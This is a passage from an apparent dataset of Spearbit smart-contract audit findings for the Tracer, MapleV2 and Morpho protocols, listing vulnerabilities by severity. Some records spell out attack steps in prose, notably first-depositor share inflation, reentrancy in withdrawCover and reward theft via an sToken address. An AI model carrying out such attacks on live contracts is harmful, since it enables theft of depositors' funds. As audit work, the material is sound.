"https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "There are a few findings that are related to mixups of types or scaling factors. The following types and scaling factors are used:  uint (no scaling)  uint (WAD scaling)  ABDKMathQuad  ABDKMathQuad (WAD scaling) Solidity >0.8.9s user defined value types could be used to prevent mistakes. This will require several typecasts, but they dont add extra gas costs.", "labels": ["Spearbit", "Tracer", "Severity: Informational"]}, {"title": "Missing events for setInvariantCheck() and setAutoClaim() in PoolFactory", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "Events should be emitted for access-controlled critical functions, and functions that set protocol parameters or affect the protocol in significant ways.", "labels": ["Spearbit", "Tracer", "Severity: Informational"]}, {"title": "Terminology used for tokens and oracles is not clear and consistent across codebase", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "Different terms are used across the codebase to address the different tokens, leading to some mixups. Assuming a pair BTC/USDC is being tracked with WETH as collateral, we think the following definitions apply:  collateral token == quote token == settlement token == WETH  pool token == long token + short token == long BTC/USDC + short BTC/USDC As for the oracles:  settlementEthOracle is the oracle for settlement in ETH (WETH/ETH)  oracleWrapper is the oracle for BTC/USDC Here is an example of a mixup: The comments in getMint() and getBurn() are different while their result should be similar. It seems the comment on getBurn() has reversed settlement and pool tokens. * @notice Calculates the number of pool tokens to mint, given some settlement token amount and a ,! price ... * @return Quantity of pool tokens to mint ... function getMint(bytes16 price, uint256 amount) public pure returns (uint256) { ... } * @notice Calculate the number of settlement tokens to burn, based on a price and an amount of ,! pool tokens //settlement & pool seem reversed ... * @return Quantity of pool tokens to burn ... function getBurn(bytes16 price, uint256 amount) public pure returns (uint256) { ... } The settlementTokenPrice variable in keeperGas() is misleading and not clear whether it is Eth per Settlement or Settlement per Eth. contract PoolKeeper is IPoolKeeper, Ownable { function keeperGas(..) public view returns (uint256) { int256 settlementTokenPrice = ,! IOracleWrapper(ILeveragedPool(_pool).settlementEthOracle()).getPrice(); ... } }", "labels": ["Spearbit", "Tracer", "Severity: Informational"]}, {"title": "Incorrect NatSpec and comments", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "Some NatSpec documentation and comments contain incorrect or unclear information. In PoolSwapLibraryL283-L293, the NatSpec for the isBeforeFrontRunningInterval() function refers to uncom- mitment, which is not longer supported. * @notice Returns true if the given timestamp is BEFORE the frontRunningInterval starts, * function isBeforeFrontRunningInterval(...) which is allowed for uncommitment. In LeveragedPool.sol#L511 the NatSpec for the withdrawQuote() function notes that the pool should not be paused while the require checks that it is paused. * @dev Pool must not be paused function withdrawQuote() ... { require(paused, \"Pool is live\"); In LeveragedPool.sol#L47 the comment is unclear, as it references a singular update interval but the mapping points to arrays. // The most recent update interval in which a user committed mapping(address => uint256[]) public unAggregatedCommitments; In PoolToken.sol#L16-L23 both the order and the meaning of the documentation are wrong.  The @param lines order should be switched.  @param amount Pool tokens to burn should be replaced with @param amount Pool tokens to mint  @param account Account to burn pool tokens to should be replaced with @param account Account to mint pool tokens to /** * @notice Mints pool tokens - * @param amount Pool tokens to burn - * @param account Account to burn pool tokens to + * @param account Account to mint pool tokens to + * @param amount Pool tokens to mint */ function mint(address account, uint256 amount) external override onlyOwner { ... } In PoolToken.sol#L25-L32 the order of the @param lines is reversed. 47 /** * @notice Burns pool tokens - * @param amount Pool tokens to burn - * @param account Account to burn pool tokens from + * @param account Account to burn pool tokens from + * @param amount Pool tokens to burn */ function burn(address account, uint256 amount) external override onlyOwner { ... } In PoolFactory.sol#L176-L203 the NatSpec @param for poolOwner is missing. It would also be suggested to change the parameter name from poolOwner to pool, since the parameter received from deployPool is the address of the pool and not the owner of the pool. /** * @notice Deploy a contract for pool tokens + * @param pool The pool address, owner of the Pool Token * @param leverage Amount of leverage for pool * @param deploymentParameters Deployment parameters for parent function * @param direction Long or short token, L- or S- * @return Address of the pool token */ function deployPairToken( - + address poolOwner, address pool, string memory leverage, PoolDeployment memory deploymentParameters, string memory direction ) internal returns (address) { ... pairToken.initialize(poolOwner, poolNameAndSymbol, poolNameAndSymbol, settlementDecimals); pairToken.initialize(pool, poolNameAndSymbol, poolNameAndSymbol, settlementDecimals); ... - + } In PoolSwapLibrary.sol#L433-L454 the comments for two of the parameters of function getMintWithBurns() are reversed. * @param amount ... * @param oppositePrice ... ... function getMintWithBurns( ... bytes16 oppositePrice, uint256 amount, ... ) public pure returns (uint256) { ... In ERC20_Cloneable.sol#L46-L49 a comment at the constructor of contract ERC20_Cloneable mentions a default value of 18 for decimals. However, it doesnt use this default value, but the supplied parameter. Moreover, a comment at the constructor of ERC20_Cloneable contract mentions _setupDecimals. This is probably a reference to an old version of the OpenZeppelin ERC20 contracts, and no longer relevant. Additionally, the comments say the values are immutable, but they are set in the initialize() function. 48 @dev Sets the values for {name} and {symbol}, initializes {decimals} with * a default value of 18. * To select a different value for {decimals}, use {_setupDecimals}. * * construction. All three of these values are immutable: they can only be set once during ... constructor(string memory name_, string memory symbol_, uint8 decimals_) ERC20(name_, symbol_) { _decimals = decimals_; } function initialize(address _pool, string memory name_, string memory symbol_, uint8 decimals_) ,! external initializer { owner = _pool; _name = name_; _symbol = symbol_; _decimals = decimals_; }", "labels": ["Spearbit", "Tracer", "Severity: Informational"]}, {"title": "First pool depositor can be front-run and have part of their deposit stolen", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The first deposit with a totalSupply of zero shares will mint shares equal to the deposited amount. This makes it possible to deposit the smallest unit of a token and profit off a rounding issue in the computation for the minted shares of the next depositor: (shares_ * totalAssets()) / totalSupply_ Example:  The first depositor (victim) wants to deposit 2M USDC (2e12) and submits the transaction.  The attacker front runs the victim's transaction by calling deposit(1) to get 1 share. They then transfer 1M USDC (1e12) to the contract, such that totalAssets = 1e12 + 1, totalSupply = 1.  When the victim's transaction is mined, they receive 2e12 / (1e12 + 1) * totalSupply = 1 shares (rounded down from 1.9999...).  The attacker withdraws their 1 share and gets 3M USDC * 1 / 2 = 1.5M USDC, making a 0.5M profit. During the migration, an _initialSupply of shares to be airdropped are already minted at initialization and are not affected by this attack.", "labels": ["Spearbit", "MapleV2.pd", "Severity: High Risk"]}, {"title": "Users depositing to a pool with unrealized losses will take on the losses", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The pool share price used for deposits is always the totalAssets() / totalSupply, however the pool share price when redeeming is totalAssets() - unrealizedLosses() / totalSupply. The unrealized- Losses value is increased by loan impairments (LM.impairLoan) or when starting triggering a default with a liq- uidation (LM.triggerDefault). The totalAssets are only reduced by this value when the loss is realized in LM.removeLoanImpairment or LM.finishCollateralLiquidation. This leads to a time window where deposits use a much higher share price than current redemptions and future deposits. Users depositing to the pool during this time window are almost guaranteed to make losses when they In the worst case, a Pool.deposit might even be (accidentally) front-run by a loan impairment or are realized. liquidation.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Medium Risk"]}, {"title": "TransitionLoanManager.add does not account for accrued interest since last call", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The TransitionLoanManager.add advances the domain start but the accrued interest since the last domain start is not accounted for. If add is called several times, the accounting will be wrong. It therefore wrongly tracks the _accountedInterest variable.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Medium Risk"]}, {"title": "Unaccounted collateral is mishandled in triggerDefault", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The control flow of triggerDefault is partially determined by the value of MapleLoanLike(loan_- ).collateral() == 0. The code later assumes there are 0 collateral tokens in the loan if this value is true, which is incorrect in the case of unaccounted collateral tokens. In non-liquidating repossessions, this causes an overes- timation of the number of fundsAsset tokens repossessed, leading to a revert in the _disburseLiquidationFunds function. Anyone can trigger this revert by manually transferring 1 Wei of collateralAsset to the loan itself. In liq- uidating repossessions, a similar issue causes the code to call the liquidator's setCollateralRemaining function with only accounted collateral, meaning unaccounted collateral will be unused/stuck in the liquidator.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Medium Risk"]}, {"title": "Initial cycle time is wrong when queuing several config updates", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The initial cycle time will be wrong if there's already an upcoming config change that changes the cycle duration. Example: currentCycleId: 100 config[0] = currentConfig = {initialCycleId: 1, cycleDuration = 1 days} config[1] = {initialCycleId: 101, cycleDuration = 7 days} Now, scheduling will create a config with initialCycleId: 103 and initialCycleTime = now + 3 * 1 days, but the cycle durations for cycles (100, 101, 102) are 1 days + 7 days + 7 days.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Medium Risk"]}, {"title": "Users cannot resubmit a withdrawal request as per the wiki", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "As per Maple's wiki: pool-v2::PoolManager.sol#371-L382, withdrawal-  Refresh: The withdrawal request can be resubmitted with the same amount of shares by calling pool.requestRedeem(0). However, the current implementation prevents Pool.requestRedeem() from being called where the shares_ pa- rameter is zero.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Low Risk"]}, {"title": "Accrued interest may be calculated on an overstated payment", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The checkTotalAssets() function is a useful helper that may be used to make business decisions in the protocol. However, if there is a late loan payment, the total interest is calculated on an incorrect payment interval, causing the accrued interest to be overstated. It is also important to note that late interest will also be excluded from the total interest calculation.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Low Risk"]}, {"title": "No deadline when liquidating a borrower's collateral", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "A loan's collateral is liquidated in the event of a late payment or if the pool delegate impairs a loan If the loan contains any amount of collateral (assuming it is different to the due to insolvency by the borrower. funds' asset), the liquidation process will attempt to sell the collateral at a discounted amount. Because a liquidation is considered active as long as there is remaining collateral in the liquidator contract, a user can knowingly liquidate all but 1 wei of collateral. As there is no incentive for others to liquidate this dust amount, it is up to the loan manager to incur the cost and responsibility of liquidating this amount before they can successfully call LoanManager.finishCollateralLiquidation().", "labels": ["Spearbit", "MapleV2.pd", "Severity: Low Risk"]}, {"title": "Loan impairments can be unavoidably unfair for borrowers", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "When a pool delegate impairs a loan, the loan's _nextPaymentDueDate will be set to the min of If the pool delegate later decides to remove the im- block.timestamp and the current _nextPaymentDueDate. pairment, the original _nextPaymentDueDate is restored to its correct value. The borrower can also remove an impairment themselves by making a payment. In this case, the _nextPaymentDueDate is not restored, which is always worse for the borrower. This can be unfair since the borrower would have to pay late interest on a loan that was never actually late (according to the original payment due date). Another related consequence is that a borrower can be liquidated before the original payment due date even passes (this is possible as long as the loan is impaired more than gracePeriod seconds away from the original due date).", "labels": ["Spearbit", "MapleV2.pd", "Severity: Low Risk"]}, {"title": "withdrawCover() vulnerable to reentrancy", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "withdrawCover() allows for reentrancy and could be abused to withdraw below the minimum cover amount and avoid having to cover protocol insolvency through a bad liquidation or loan default. The moveFunds() function could transfer the asset amount to the recipient specified by the pool delegate. Some In this case, the pool delegate could reenter the tokens allow for callbacks before the actual transfer is made. withdrawCover() function and bypass the balance check as it is made before tokens are actually transferred. This can be repeated to empty out required cover balance from the contract. It is noted that the PoolDelegateCover contract is a protocol controlled contract, hence the low severity.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Low Risk"]}, {"title": "Bad parameter encoding and deployment when using wrong initializers", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The initializers used to encode the arguments, when deploying a new pool in PoolDeployer, might not be the initializers that the proxy factory will use for the default version and might lead to bad parameter encoding & deployments if a wrong initializer is passed.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Low Risk"]}, {"title": "Event LoanClosed might be emitted with the wrong value", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "In function closeLoan function, the fees are got by the getClosingPaymentBreakdown function and it is not adding refinances fees after in code are paid all fee by payServiceFees which may include refinances fees. The event LoanClose might be emitted with the wrong fee value.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Low Risk"]}, {"title": "Bug in makePayment() reverts when called with small amounts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "When makePayment() is called with an amount which is less than the fees payable, then the trans- action will always revert, even if there is an adequate amount of drawable funds. The revert happens due to an underflow in getUnaccountedAmount() because the token balance is decremented on the previous line without updating drawable funds.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Low Risk"]}, {"title": "Pool.previewWithdraw always reverts but Pool.withdraw can succeed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The Pool.previewWithdraw => PM. previewWithdraw => WM.previewWithdraw function call se- quence always reverts in the WithdrawalManager. However, the Pool.withdraw function can succeed. This behavior might be unexpected, especially, as integrators call previewWithdraw before doing the actual withdraw call.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Low Risk"]}, {"title": "Setting a new WithdrawalManager locks funds in old one", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The WithdrawalManager only accepts calls from a PoolManager. When setting a new withdrawal manager with PoolManager.setWithdrawalManager, the old one cannot be accessed anymore. Any user shares locked for withdrawal in the old one are stuck.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Low Risk"]}, {"title": "Use whenProtocolNotPaused on migrate() instead of upgrade() for more complete protection", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "whenProtocolNotPaused is added to migrate() for the Liquidator, MapleLoan, and Withdrawal- Manager contracts in order to protect the protocol by preventing it from upgrading while the protocol is paused. However, this protection happens only during upgrade, and not during instantiation.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Low Risk"]}, {"title": "Missing post-migration check in PoolManager.sol could result in lost funds", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The protocol employs an upgradeable/migrateable system that includes upgradeable initializers for factory created contracts. For the most part, a storage value that was left uninitialized due to an erroneous initializer would not be affect protocol funds. For example forgetting to initialize _locked would cause all nonReentrant functions to revert, but no funds lost. However, if the poolDelegateCover address were unset and depositCover() were called, the funds would be lost as there is no to != address(0) check in transferFrom.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Low Risk"]}, {"title": "Globals.poolDelegates[delegate_].ownedPoolManager mapping can be overwritten", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The Globals.poolDelegates[delegate_].ownedPoolManager keeps track of a single pool manager for a pool delegate. It can happen that the same pool delegate is registered for a second pool manager and the mapping is overwritten, by calling PM.acceptPendingPoolDelegate -> Globals.transferOwnedPoolManager or Globals.activatePoolManager.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Low Risk"]}, {"title": "Pool withdrawals can be kept low by non-redeeming users", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "In the current pool design, users request to exit the pool and are scheduled for a withdrawal window in the withdrawal manager. If the pool does not have enough liquidity, their share on the available pool liquidity is proportionate to the total shares of all users who requested to withdraw in that withdrawal window. It's possible for griefers to keep the withdrawals artificially low by requesting a withdrawal but not actually withdraw- ing during the withdrawal window. These griefers are not penalized but their behavior leads to worse withdrawal amounts for every other honest user.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Low Risk"]}, {"title": "_getCollateralRequiredFor should round up", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The _getCollateralRequiredFor rounds down the collateral that is required from the borrower. This benefits the borrower.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Low Risk"]}, {"title": "Use the cached variable in makePayment", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The claim function is called using _nextPaymentDueDate instead of nextPaymentDueDate_", "labels": ["Spearbit", "MapleV2.pd", "Severity: Gas Optimization"]}, {"title": "No need to explicitly initialize variables with default values", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "By default a value of a variable is set to 0 for uint, false for bool, address(0) for address. . . Explicitly initializing/setting it with its default value wastes gas.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Gas Optimization"]}, {"title": "Cache calculation in getExpectedAmount", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The decimal precision calculation is used twice in the getExpectedAmount function, if you cache into a new variable would save some gas.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Gas Optimization"]}, {"title": "For-Loop Optmization", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The for-loop can be optimized in 4 ways: 1. Removing initialization of loop counter if the value is 0 by default. 2. Caching array length outside the loop. 3. Prefix increment (++i) instead of postfix increment (i++). 4. Unchecked increment. - for (uint256 i_ = 0; i_ < loans_.length; i_++) { + uint256 length = loans_.length; + for (uint256 i_; i_ < length; ) { ... + unchecked { ++i; } }", "labels": ["Spearbit", "MapleV2.pd", "Severity: Gas Optimization"]}, {"title": "Pool._divRoundUp can be more efficient", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The gas cost of Pool._divRoundUp can be reduced in the context that it's used in.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Gas Optimization"]}, {"title": "Liquidator uses different reentrancy guards than rest of codebase", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "All other reentrancy guards of the codebase use values 1/2 instead of 0/1 to indicate NOT_- LOCKED/LOCKED.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Gas Optimization"]}, {"title": "Use block.timestamp instead of domainStart in removeLoanImpairment", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The removeLoanImpairment function adds back all interest from the payment's start date to domain- Start. The _advanceGlobalPaymentAccounting sets domainStart to block.timestamp.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Gas Optimization"]}, {"title": "setTimelockWindows checks isGovernor multiple times", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The Globals.setTimelockWindows function calls setTimelockWindow in a loop and each time set- TimelockWindow's isGovernor is checked.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Gas Optimization"]}, {"title": "fullDaysLate computation can be optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The fullDaysLate computation can be optimized.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Gas Optimization"]}, {"title": "Users can prevent repossessed funds from being claimed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The DebtLocker.sol contract dictates an active liquidation by the following two conditions:  The _liquidator state variable is a non-zero address.  The current balance of the _liquidator contract is non-zero. If an arbitrary user sends 1 wei of funds to the liquidator's address, the borrower will be unable to claim repos- sessed funds as seen in the _handleClaimOfRepossessed() function. While the scope of the audit only covered the diff between v3.0.0 and v4.0.0-rc.0, the audit team decided it was important to include this as an informational issue. The Maple team will be addressing this in their V2 release.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "MEV whenever totalAssets jumps", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "An attack users can try to capture large interest payments is sandwiching a payment with a deposit and a withdrawal. The current codebase tries to mostly eliminate this attack by:  Optimistically assuming the next interest payment will be paid back and accruing the interest payment linearly over the payment interval.  Adding a withdrawal period. However, there are still circumstances where the totalAssets increase by a large amount at once:  Users paying back their payment early. The jump in totalAssets will be the paymentAmount - timeE- lapsedSincePaymentStart / paymentInterval * paymentAmount.  Users paying back their entire loan early (closeLoan).  Late payments increase it by the late interest fees and the accrued interest for the next payment from its start date to now. 21", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "Use ERCHelper approve() as best practice", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The ERC20 approve function is being used by fundsAsset in fundLoan() to approve the max amount which does not check the return value.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "Additional verification in removeLoanImpairment", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "Currently, if removeLoanImpairment is called after the loan's original due date, there will be no issues because the loan's removeLoanImpairment function will revert. It would be good to add a comment about this logic or duplicate the check explicitly in the loan manager. If the loan implementation is upgraded in the future to have a non-reverting removeLoanImpairment function, then the loan manager as-is would account for the interest incorrectly.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "Can check msg.sender != collateralAsset/fundsAsset for extra safety", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "Some old ERC tokens (e.g. the Sandbox's SAND token) allow arbitrary calls from the token address itself. This odd behavior is usually a result of implementing the ERC677 approveAndCall and transferAndCall functions incorrectly. With these tokens, it is technically possible for the low-level msg.sender.call(...) in the liquidator to be executing arbitrary code on one of the tokens, which could let an attacker drain the funds.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "IERC426 Implementation of preview and max functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "For the preview functions, EIP 4626 states: MAY revert due to other conditions that would also cause the deposit [mint/redeem, etc.] to revert. But the comments in the interface currently state: MUST NOT revert. In addition to the comments, there is the actual behavior of the preview functions. A commonly accepted interpreta- tion of the standard is that these preview functions should revert in the case of conditions such as protocolPaused, !active, !openToPublic totalAssets > liquidityCap etc. The argument basically states that the max functions should return 0 under such conditions and the preview functions should revert whenever the amount exceeds the max.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "Set domainEnd correctly in intermediate _advanceGlobalPaymentAccounting steps", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "pay- ments[paymentWithEarliestDueDate].paymentDueDate, which is possibly zero if the last payment has just been accrued past. This is currently not an issue, because in this scenario domainEnd would never be used before it is set back to its correct value in _updateIssuanceParams. However, for increased readability, it is recommended to prevent this odd intermediate state from ever occurring. domainEnd function, set to is", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "Replace hard-coded value with PRECISION constant", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The constant PRECISION is equal to 1e30. The hard-coded value 1e30 is used in the _queueNext- Payment function, which can be replaced by PRECISION.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "Use of floating pragma version", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "Contracts should be deployed using a fixed pragma version. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, an outdated compiler version that might introduce bugs that affect the contract system negatively.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "PoolManager has low-level shares computation logic", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The PoolManager has low-level shares computation logic that should ideally only be in the ERC4626 Pool to separate the concerns.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "Add additional checks to prevent refinancing/funding a closed loan", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "It's important that an already liquidated loan is not reused by refinancing or funding again as it would break a second liquidation when the second liquidator contract is deployed with the same arguments and salt.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "PoolManager.removeLoanManager errors with out-of-bounds if loan manager not found", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The PoolManager.removeLoanManager errors with an out-of-bounds error if the loan manager is not found.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "PoolManager.removeLoanManager does not clear loanManagers mapping", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The PoolManager.removeLoanManager does not clear the reverse loanManagers[mapleLoan] = loanManager mapping.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "Pool._requestRedeem reduces the wrong approval amount", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The requestRedeem function transfers escrowShares_ from owner but reduces the approval by shares_. Note that in the current code these values are the same but for future PoolManager upgrades this could change.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "Issuance rate for double-late claims does not need to be updated", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The previousRate_ for the 8c) case in claim is always zero because the payment (!onTimePayment_). The subtraction can be removed is late I'd suggest removing the subtraction here as it's confusing. The first payment's IR was reduced in _advanceGlob- alPaymentAccounting, the newly scheduled one that is also past due date never increased the IR.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "Additional verification that paymentIdOf[loan_] is not 0", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "Most functions in the loan manager use the value paymentIdOf[loan_] without first checking if it's the default value of 0. Anyone can pay off a loan at any time to cause the claim function to set paymentIdOf[loan_] to 0, so even the privileged functions could be front-run to call on a loan with paymentIdOf 0. This is not an issue in the current codebase because each function would revert for some other reasons, but it is recommended to add an explicit check so future upgrades on other modules don't make this into a more serious issue.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "LoanManager redundant check on late payment", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "block.timestamp <= nextPaymentDueDate_ in one of the if statements. The payment is already known to be late at this point in the code, so block.timestamp > previousPaymentDueDate_ is always true.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "Add encodeArguments/decodeArguments to WithdrawalManagerInitializer", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "Unlike the other Initializers, the WithdrawalManagerInitializer.sol does not have public en- codeArguments/decodeArguments functions, and PoolDeployer need to be changed to use these functions cor- rectly", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "Reorder WM.processExit parameters", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "All other WM and Pool function signatures start with (uint256 shares/assets, address owner) parameters but the WM.processExit has its parameters reversed (address, uint256).", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "Additional verification in MapleLoanInitializer", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The MapleLoanInitializer could verify additional arguments to avoid bad pool deployments.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "Clean up updatePlatformServiceFee", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The updatePlatformServiceFee can be cleaned up to use an existing helper function", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "Document restrictions on Refinancer", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The refinancer may not set unexpected storage slots, like changing the _fundsAsset because _- drawableFunds, _refinanceInterest are still measured in the old fund's asset.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "Typos / Incorrect documentation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The code and comments contain typos or are sometimes incorrect.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "Wrong P2P exchange rate calculation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "_p2pDelta is divided by _poolIndex and multiplied by _p2pRate, nevertheless it should have been multiplied by _poolIndex and divided by _p2pRate to compute the correct share of the delta. This leads to wrong P2P rates throughout all markets if supply / borrow delta is involved.", "labels": ["Spearbit", "Morpho", "Severity: Critical Risk"]}, {"title": "MatchingEngineForAave is using the wrong totalSupply in updateBorrowers", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "_poolTokenAddress is referencing AToken so the totalStaked would be the total supply of the AToken. In this case, the totalStaked should reference the total supply of the DebtToken, otherwise the user would be rewarded for a wrong amount of reward.", "labels": ["Spearbit", "Morpho", "Severity: Critical Risk"]}, {"title": "RewardsManagerAave does not verify token addresses", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Aave has 3 different types of tokens: aToken, stable debt token and variable debt token (a/s/vToken). Aaves incentive controller can define rewards for all of them but Morpho never uses a stable-rate borrows token (sToken). The public accrueUserUnclaimedRewards function allows passing arbitrary token addresses for which to accrue user rewards. Current code assumes that if the token is not the variable debt token, then it must be the aToken, and uses the users supply balance for the reward calculation as follows: 5 uint256 stakedByUser = reserve.variableDebtTokenAddress == asset ? positionsManager.borrowBalanceInOf(reserve.aTokenAddress, _user).onPool : positionsManager.supplyBalanceInOf(reserve.aTokenAddress, _user).onPool; An attacker can accrue rewards by passing in an sToken address and steal from the contract, i.e:  Attacker supplies a large amount of tokens for which sToken rewards are defined.  The aToken reward index is updated to the latest index but the sToken index is not initialized.  Attacker calls accrueUserUnclaimedRewards([sToken]), which will compute the difference between the cur- rent Aave reward index and users sToken index, then multiply 